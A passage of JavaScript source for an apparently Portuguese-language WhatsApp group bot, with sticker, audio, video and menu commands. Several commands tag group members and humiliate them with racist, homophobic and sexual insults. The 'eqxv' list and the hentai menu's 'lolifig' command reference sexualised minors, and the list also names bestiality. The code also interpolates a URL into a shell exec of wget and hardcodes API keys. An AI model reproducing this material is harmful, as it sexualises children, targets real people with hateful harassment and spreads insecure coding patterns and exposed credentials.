                                                loli.sendMessage(from, nobg, sticker, {quoted: mek})
                                                fs.unlinkSync(rano)
                                        })
                                    
                                             } else {
                                                 reply('Você precisa marcar ou enviar uma imagem para isso')
                                          }
                                             break
                                             case 'gayfig': 
                                        var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
                                         reply(mess.wait)
                                         owgi = await  loli.downloadAndSaveMediaMessage(ger)
                                         anu = await imgbb("941644256336912a1409c0bcfce50071", owgi)
                                        teks = `${anu.display_url}`
                                        ranp = getRandom('.png')
                                        rano = getRandom('.webp')
                                        anu1 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
                                         exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                                         if (err) return reply(mess.error.stick)
                                                nobg = fs.readFileSync(rano)
                                                 loli.sendMessage(from, nobg, sticker, {quoted: mek})
                                                fs.unlinkSync(rano)
                                        })
                                    
                                             } else {
                                                 reply('Use a foto!')
                                          }
                                             break
                                             case 'placa':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://api.zeks.me/api/gplaybutton?text=${teks}&apikey=apivinz`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null, caption: '*PRONTINHO ✓*'})
					break
					 
					case 'gostosa':
					case 'gostoso':
						try {
						buff = await getBuffer('https://i.imgur.com/NMRuuGW.jpg')
						r = Math.floor(Math.random() * 100 + 0)
						if(args.length < 1) {
							if(isGroup) { num1 = mek.participant.slice(0, -15)+'@s.whatsapp.net'}
							else{ num1 = mek.key.remoteJid.slice(0, -15)+'@s.whatsapp.net'}
						}
						else { num1 = args[0] 
							if(!isNaN(num1.slice(1)))
							{
								if(num1.startsWith('@')) {num1 = num1.slice(1)+'@s.whatsapp.net'}
							}
						}
						if(num1.slice(0, -15) == '') { num1 = num1+'@s.whatsapp.net'}
						loli.sendMessage(from, `*Aguarde onii-chan @${num1.slice(0, -15)}, pegando...🖤*`, extendedText, {quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
						setTimeout(async function () {
							if(r == 0) return loli.sendMessage(from, buff, image, {caption: `*O @${num1.slice(0, -15)} parece que pegou fogo e foi apagado com gasolina kkkkkkkk, tu é mt feio em neguin kkkkkk*`,quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 0 && r <= 33) return loli.sendMessage(from, buff, image, {caption: `*O @${num1.slice(0, -15)} é ${r}% gostoso(a)*\n*Tão feio que pra dar role com os amigos(as), eles tem que falar com a mãe "Seu jorge por favor me empresta o dragão" 🤣🤣*`,quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 33 && r <= 40) return loli.sendMessage(from, buff, image, {caption: `*O @${num1.slice(0, -15)} é ${r}% gostoso(a)*\n*Parece mais um sirigueijo, um caranguejo amassado kkkkkkkk*`,quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 40 && r <= 66) return loli.sendMessage(from, buff, image, {caption: `*O @${num1.slice(0, -15)} é ${r}% gostoso(a)*\n*Bonitinho você ein 😳👉👈*`, quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 66 && r <= 100) return loli.sendMessage(from, buff, image, {caption: `*O @${num1.slice(0, -15)} é ${r}% gostoso(a)*\n*Passa o zap o-onii-chan 😳👉👈*`, quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
						}, 3000)
						} catch {
							reply('Deu erro')
						}
						break
case 'chifre':
					buff= await getBuffer('https://i.pinimg.com/564x/7b/70/d7/7b70d725ad4d183815290d43d8095530.jpg')
					r = Math.floor(Math.random() * 100 + 0)
					if(args.length < 1) {
						if(isGroup) { num1 = mek.participant.slice(0, -15)+'@s.whatsapp.net'}
						else{ num1 = mek.key.remoteJid.slice(0, -15)+'@s.whatsapp.net'}
					}
					else { num1 = args[0] 
						if(!isNaN(num1.slice(1)))
						{
							if(num1.startsWith('@')) {num1 = num1.slice(1)+'@s.whatsapp.net'}
						}
					}
					if(num1.slice(0, -15) == '') { num1 = num1+'@s.whatsapp.net'}
					loli.sendMessage(from, `*Aguarde onii-chan @${num1.slice(0, -15)}, pegando...🖤*`, extendedText, {quoted: mek, contextInfo: { mentionedJid: [num1]}})
					setTimeout(async function () {
						if(num1.includes(OriginalOwner)) return reply('*Meu criador não é corno*\n*Mas pelo oq eu vi aq os dados me dizem ao contrário sobre você🤨*')
						if(r == 0) return loli.sendMessage(from, buff, image, {caption: `*O @${num1.slice(0, -15)} não é corno*\n*mas talvez você seja 🤨`, quoted: mek, contextInfo: { mentionedJid: [num1]}})
						if(r > 0 && r <= 33) return loli.sendMessage(from, buff, image, {caption: `*O @${num1.slice(0, -15)} é ${r}% corno*\n*jogador de free fire*`, quoted: mek, contextInfo: { mentionedJid: [num1]}})
						if(r > 33 && r <= 66) return loli.sendMessage(from, buff, image, {caption: `*O @${num1.slice(0, -15)} é ${r}% corno*\n*1km de chifre kkkkkkk*`, quoted: mek, contextInfo: { mentionedJid: [num1]}})
						if(r > 66 && r <= 100) return loli.sendMessage(from, buff, image, {caption: `*O @${num1.slice(0, -15)} é ${r}% corno*\n*pesca satélite com o chifre é? kkkkk🤣🤣*`, quoted: mek, contextInfo: { mentionedJid: [num1]}})
					}, 3000)
					break
					case 'eqxv':
						if (!isGroup)return reply(mess.only.group)
						const xisvideos = groupMembers
						const surpresa = xisvideos[Math.floor(Math.random() * xisvideos.length)]
						var xvid = ["Negoes branquelos e feministas", `se depilando na banheira`, `comendo meu cuzinho`, `quer me comer o que fazer?`, "lolis nuas e safadas", "Ursinhos Mansos Peludos e excitados", "mae do adm cozida na pressao", "Buceta de 500 cm inflavel da boneca chinesa lolita company", "corno manso batendo uma pra mim com meu rosto na webcam", "tigresa vip da buceta de mel", "belle delphine dando o cuzinho no barzinho da esquina", "fazendo anal no negao", "africanos nus e chupando pau", "anal africano", "comendo a minha tia", "lgbts fazendo ahegao", "adm gostoso tirando a roupa", "gays puxando o intestino pra fora", "Gore de porno de cachorro", "anoes baixinhos do pau grandao", "Anões Gays Dotados Peludos", "anões gays dotados penetradores de botas", "Ursinhos Mansos Peludos", "Jailson Mendes", "Vendo meu Amigo Comer a Esposa", "Golden Shower"]
						const surpresa2 = xvid[Math.floor(Math.random() * xvid.length)]
						xvideosgame = `*EQUIPE ❌VIDEOS*\n\n_Caro usuário\n@${surpresa.jid.split('@')[0]}\n\n_Sou da administração do Xvideos e nós percebemos que você não entrou em sua conta por mais de 2 semanas e decidimos checar pra saber se está tudo OK com o(a) nosso(a) usuário(a) mais ativo(a)._ \n\n_Desde a última vez que você visitou nosso site, você procurou mais de centenas de vezes por_ *"${surpresa2}"* _(acreditamos ser sua favorita), viemos dizer que elas foram adicionadas e temos certeza que você irá gostar bastante._ \n_Esperamos você lá!_\n\n_Para o nosso usuário(a) favorito(a), com carinho, Equipe Xvideos._`
						mentions(xvideosgame, true)
						break
						case "gostosas2":
						case "Gostosas2":
                        membr = []
                        const exea12 = groupMembers
                        const exeb12 = groupMembers
                        const exec12 = groupMembers
                        const siapv = exea12[Math.floor(Math.random() * exea12.length)]
                        const siopx = exeb12[Math.floor(Math.random() * exeb12.length)]
                        teks = `ＤＥＴＥＣＴＯＲ   ＤＥ  ＧＯＳＴＯＳＡＳ\n\n*pi pi pi pi*  \n*pipipipi🚨🚨🚨pipipipi🚨🚨🚨pipipipi🚨🚨🚨pipi*\n\n@${siopx.jid.split('@')[0]}\n@${siapv.jid.split('@')[0]}\n*PARADAS(OS) AÍ🖐\n\n*VOCÊ ACABA DE RECEBER DUAS MULTAS\n\n*1 por não dar bom dia,boa tarde,boa noite e outra por ser muito*\n\n*gostosa(o)*`
                        membr.push(siapv.jid)
                        membr.push(siopx.jid)
                        mentions(teks, membr, true)
                        break
case 'onichan':
tujuh = fs.readFileSync('./assets/onichan.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'ola':
tujuh = fs.readFileSync('./assets/ola.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'bv':
tujuh = fs.readFileSync('./assets/bv.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'tchau':
tujuh = fs.readFileSync('./assets/tchau.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'bem':
tujuh = fs.readFileSync('./assets/bem.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'a':
tujuh = fs.readFileSync('./assets/a.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'fdp':
tujuh = fs.readFileSync('./assets/fdp.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'beat1':
tujuh = fs.readFileSync('./assets/beat1.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'glub':
tujuh = fs.readFileSync('./assets/glub.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'mercury':
tujuh = fs.readFileSync('./bi/mercury.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'ponta':
tujuh = fs.readFileSync('./bi/ponta.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'speak':
tujuh = fs.readFileSync('./bi/speak.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'moça':
tujuh = fs.readFileSync('./bi/moça.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'nav':
tujuh = fs.readFileSync('./bi/nav.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'dama':
tujuh = fs.readFileSync('./bi/dama.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'remedy':
tujuh = fs.readFileSync('./bi/remedy.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'cavala':
tujuh = fs.readFileSync('./bi/cavala.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'facetime':
tujuh = fs.readFileSync('./bi/facetime.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'pe':
tujuh = fs.readFileSync('./bi/pe.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'nike12':
tujuh = fs.readFileSync('./bi/nike12.mp3');
loli.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
//say
case 'say1':
tujuh = fs.readFileSync('./assets/say1.mp4');
loli.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'say2':
tujuh = fs.readFileSync('./assets/say2.mp4');
loli.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'say3':
tujuh = fs.readFileSync('./assets/say3.mp4');
loli.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'say4':
tujuh = fs.readFileSync('./assets/say4.mp4');
loli.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
//xxx
case 'xxx1':
tujuh = fs.readFileSync('./assets/xxx1.mp4');
loli.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'xxx2':
tujuh = fs.readFileSync('./assets/xxx2.mp4');
loli.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
//variados
case 'edit5':
tujuh = fs.readFileSync('./assets/edit5.mp4');
loli.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'edit1':
tujuh = fs.readFileSync('./assets/edit1.mp4');
loli.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'edit2':
tujuh = fs.readFileSync('./assets/edit2.mp4');
loli.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'edit3':
tujuh = fs.readFileSync('./assets/edit3.mp4');
loli.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'edit4':
tujuh = fs.readFileSync('./assets/edit4.mp4');
loli.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
                    case 'hentaimenu':
                    case 'menuhentai':
                      addFilter(from)
                      if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                    const hentaigif1 = fs.readFileSync('./src/hentaigif.mp4')
                    loli.sendMessage(from, hentaigif1, MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: `
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ ᴍᴇɴᴜ ᴅᴇ ʜᴇɴᴛᴀɪ🔞
┃⋆│
┃⋆│💎➢ ${prefix}trap ⟨🔞⟩
┃⋆│➥ imagem de trap hentai
┃⋆│💎➢ ${prefix}waifu2 ⟨🔞⟩
┃⋆│➥ manda imagem random hentai 2k a 4k
┃⋆│💎➢ ${prefix}pernas ⟨🔞⟩
┃⋆│➥ manda imagem random de pernas hentai
┃⋆│💎➢ ${prefix}oppai ⟨🔞⟩
┃⋆│➥ manda imagem de hentai com peitos
┃⋆│💎➢ ${prefix}ero ⟨🔞⟩
┃⋆│➥ imagem sexualizando hentai
┃⋆│💎➢ ${prefix}anal ⟨🔞⟩
┃⋆│➥ hentai com anal hentai
┃⋆│💎➢ ${prefix}ahegao ⟨🔞⟩
┃⋆│➥ hentai com ahegao hentai
┃⋆│💎➢ ${prefix}futa ⟨🔞⟩ hentai
┃⋆│➥ imagem com futanari hentai
┃⋆│💎➢ ${prefix}bigoppai ⟨🔞⟩
┃⋆│➥ imagem hentai com peitos enormes
┃⋆│💎➢ ${prefix}yaoi  ⟨🔞⟩
┃⋆│➥ hentai gay ou BL
┃⋆│💎➢ ${prefix}yuri  ⟨🔞⟩
┃⋆│➥ hentai lesbico 
┃⋆│💎➢ ${prefix}elfa  ⟨🔞⟩
┃⋆│➥ hentai com elfas
┃⋆│💎➢ ${prefix}blowjob ⟨🔞⟩
┃⋆│➥ gif em forma de sticker boquete
┃⋆│💎➢ ${prefix}neko2  ⟨🔞⟩
┃⋆│➥ imagem de neko hentai
┃⋆│💎➢ ${prefix}neko ⟨Texto⟩ ⟨🔞⟩
┃⋆│➥ imagem de neko normal
┃⋆│💎➢ ${prefix}beijar2 ⟨🔞⟩
┃⋆│➥ manda um gif em sticker beijando
┃⋆│💎➢ ${prefix}sorrir ⟨🔞⟩
┃⋆│➥ manda um sticker animado sorrindo anime
┃⋆│💎➢ ${prefix}hentaifig ⟨🔞⟩
┃⋆│➥ manda gif em sticker hentai
┃⋆│💎➢ ${prefix}nfig ⟨🔞⟩
┃⋆│➥ manda um sticker de uma neko
┃⋆│💎➢ ${prefix}nekofig ⟨🔞⟩
┃⋆│➥ manda um sticker de uma neko hentai 
┃⋆│💎➢ ${prefix}lolifig ⟨🔞⟩
┃⋆│➥ manda sticker de loli hentai
┃⋆│💎➢ ${prefix}chorar ⟨🔞⟩
┃⋆│➥ manda gif em sticker chorando
┃⋆│💎➢ ${prefix}kill ⟨🔞⟩
┃⋆│➥ manda gif em sticker de morte
┃⋆│💎➢ ${prefix}baka ⟨🔞⟩
┃⋆│➥ manda gif em sticker baka
┃⋆│💎➢ ${prefix}cum ⟨🔞⟩
┃⋆│➥ manda imagem hentai de gozada
┃⋆│💎➢ ${prefix}bunda ⟨🔞⟩
┃⋆│➥ manda imagem hentai de bunda
┃⋆│💎➢ ${prefix}sovaco ⟨🔞⟩
┃⋆│➥ manda imagem hentai de sovaco
┃⋆│💎➢ ${prefix}hentaipe ⟨🔞⟩
┃⋆│➥ manda imagem hentai de pe
┃⋆│💎➢ ${prefix}sideoppai ⟨🔞⟩
┃⋆│➥ manda imagem hentai de peito de lado
┃⋆│💎➢ ${prefix}vtubers ⟨🔞⟩
┃⋆│➥ manda imagem hentai de vtubers
┃⋆│💎➢ ${prefix}hentai ⟨🔞⟩
┃⋆│➥ manda imagem hentai aleatório
┃⋆│💎➢ ${prefix}hentainuds ⟨🔞⟩
┃⋆│➥ manda imagem hentai nuds
┃⋆│💎➢ ${prefix}eroyuri ⟨🔞⟩
┃⋆│➥ manda imagem hentai lesbico sexualizado
┃⋆│💎➢ ${prefix}erok ⟨🔞⟩
┃⋆│➥ manda imagem hentai de raposa
┃⋆│💎➢ ${prefix}lewdkemo ⟨🔞⟩
┃⋆│➥ manda imagem hentai sexual
┃⋆│💎➢ ${prefix}food ⟨🔞⟩
┃⋆│➥ manda um gif sticker comendo
┃⋆│💎➢ ${prefix}yurigif ⟨🔞⟩
┃⋆│➥ manda um gif sticker lesbico
┃⋆│💎➢ ${prefix}pegif ⟨🔞⟩
┃⋆│➥ manda um gif sticker batendo com o pe
┃⋆│💎➢ ${prefix}pussygif ⟨🔞⟩
┃⋆│➥ manda um gif sticker de siririca
┃⋆│💎➢ ${prefix}wallpaper ⟨🔞⟩
┃⋆│➥ manda um wallpaper para celular
┃⋆│💎➢ ${prefix}wallpapersearch ⟨🔞⟩
┃⋆│➥ procura um wallpaper para celular
┃⋆│💎➢ ${prefix}nhentai (codigo) ⟨🔞⟩
┃⋆│➥ manda em pdf hentai do nhentai
┃⋆│💎➢ ${prefix}spank ⟨🔞⟩
┃⋆│➥ manda imagem hentai de tapa
┃⋆│💎➢ ${prefix}classic ⟨🔞⟩
┃⋆│➥ manda hentai classic
┃⋆│💎➢ ${prefix}siririca ⟨🔞⟩
┃⋆│➥ manda hentai de siririca
┃⋆│💎➢ ${prefix}lick ⟨🔞⟩
┃⋆│➥ manda fig de linguada hentai
┃⋆│💎➢ ${prefix}fanart ⟨🔞⟩
┃⋆│➥ manda fanart de 2k a 4k
┃⋆│💎➢ ${prefix}milf ⟨🔞⟩
┃⋆│➥ manda imagem milf hentai
┃⋆│💎➢ ${prefix}ecchi ⟨🔞⟩
┃⋆│➥ manda imagem ecchi
┃⋆│💎➢ ${prefix}cosplay ⟨🔞⟩
┃⋆│➥ imagem cosplay(não +18)
┃⋆│💎➢ ${prefix}cringe ⟨🔞⟩
┃⋆│➥ manda fig cringe
┃⋆│💎➢ ${prefix}dance ⟨🔞⟩
┃⋆│➥ manda fig dancando
┃⋆│💎➢ ${prefix}corar ⟨🔞⟩
┃⋆│➥ manda fig corando
┃⋆│💎➢ ${prefix}gasm ⟨🔞⟩
┃⋆│➥ manda fig orgasmo
┃⋆│💎➢ ${prefix}bonk ⟨🔞⟩
┃⋆│➥ manda fig bonk
┃⋆│💎➢ ${prefix}apertar ⟨🔞⟩
┃⋆│➥ manda fig apertar
┃⋆│💎➢ ${prefix}carinho ⟨🔞⟩
┃⋆│➥ manda fig carinho
┃⋆│💎➢ ${prefix}piscar ⟨🔞⟩
┃⋆│➥ manda fig piscar
┃⋆╰───────────────────
╰━════════════════════⊷
⭐👸Cσɱαɳԃσʂ ԃҽ ԋҽɳƚαι👸⭐`})
                    break 
                    case 'msc':
                    case 'músicas':
                    case 'musicas':
                    addFilter(from)
         if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
         const musica17 = fs.readFileSync('./src/msc.mp4')
loli.sendMessage(from, musica17,  MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: `
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ ᴍᴇɴᴜ ᴅᴇ ᴍᴜsɪᴄᴀs
┃⋆│
┃⋆│💎➢ ${prefix}hylander ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}nikeb ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}AkDoFlamengo ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}moça ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}remedy ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}dama ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}pe ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}m4 ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}cmgremio ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}mercury ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}cmflamengo ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}macaverde ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}ponta ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}Nemo ⟨🎧
┃⋆│
┃⋆│💎➢ ${prefix}nav ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}cavala ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}BanhoDeLeite ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}kalidade ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}facetime  ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}nike12 ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}beat1 ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud fucklove ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud badgirl ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud xote ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud ahegao ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud stay ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud heart ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud idearemix ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud senpai ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud macho ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud japanese ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud bloody ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud ben10 ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud gta ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud dancinha ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud groove ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud maniac ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud queen ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud devils ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud sanctum ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud antartical ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud andromeda ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud rumble ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud infinity ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud tied ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud mikasa ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud rokket ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud fire ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud forever ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud god ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud hurt ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud gone ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud bodypartz ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud goes ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud search ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud nuts ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud g6 ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud fear ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud pula ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud fifth ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud angel ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud umbra ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud life ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud phonky ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud dark ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud gay ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud toxic ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud one ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud dress ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud cubic ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud nest ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud enemy ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud adam ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud storm ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud laespada ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud oceans ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud lucky ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud kingslayer ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud called ⟨🎧⟩
┃⋆│
┃⋆│💎➢ ${prefix}getaud mega ⟨🎧⟩
┃⋆╰───────────────────
╰━════════════════════⊷  `
})
break
case 'edits':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const editgif3 = fs.readFileSync('./src/editgif.mp4')
loli.sendMessage(from, editgif3,  MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: `
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ ᴍᴇɴᴜ ᴅᴇ ᴇᴅɪᴛ 
┃⋆│💎➢ ${prefix}edit1 ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}edit2 ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}edit3 ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}edit4 ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}edit5 ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}xxx1 ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}xxx2 ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}say1 ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}say2 ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}say3 ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}say4 ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo bunda ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo cum ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo fogo ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo karai ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo zap ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo feel ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo hori ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo mikasa ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo hentai ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo energy ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo milk ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo badgirl ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo bye ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo animes ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo genshin ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo rimuru ⟨🎬⟩
┃⋆│
